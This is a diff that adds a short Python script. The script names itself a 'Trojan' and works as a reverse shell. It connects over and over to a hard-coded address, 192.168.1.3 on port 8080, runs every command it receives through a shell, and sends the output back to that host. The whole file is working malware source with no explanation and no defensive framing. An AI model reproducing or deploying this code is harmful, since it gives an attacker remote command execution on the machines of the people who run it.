@@ -1,0 +1,59 @@
+import socket
+from time import sleep
+import subprocess
+
+ip = '192.168.1.3'
+port = 8080
+
+def connect(ip, port):
+    try:
+        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        c.connect((ip, port))
+        return c
+    except Exception as e:
+        print(f"Error connecting to {ip}:{port} - {e}")
+        return None
+
+def cmd(c, data):
+    try:
+        p = subprocess.Popen(
+            data, 
+            shell = True,
+            stdin=subprocess.PIPE, 
+            stderr=subprocess.PIPE,
+            stdout=subprocess.PIPE
+        )
+        c.send(
+            p.stdout.read() + p.stderr.read() + b"\n"
+        )
+    except Exception as e:
+        print(f"Error executing command '{data}' - {e}")
+
+def listen(c):
+    try:
+        while True:
+            data = c.recv(1024).decode()
+            if data == 'exit':
+                exit()
+                return
+            else:
+                cmd(c, data)
+
+    except Exception as e:
+        print(f"Error listening on {c.getsockname()} - {e}")
+
+               
+if __name__ == "__main__":
+    try:
+        while True:
+            client = connect(ip, port)
+            if client:
+                listen(client)
+            else:
+                sleep(0.5)
+
+    except KeyboardInterrupt:
+        print("Trojan terminated by user.")
+
+    except Exception as error:
+        print(f"An error occurred: {error}")
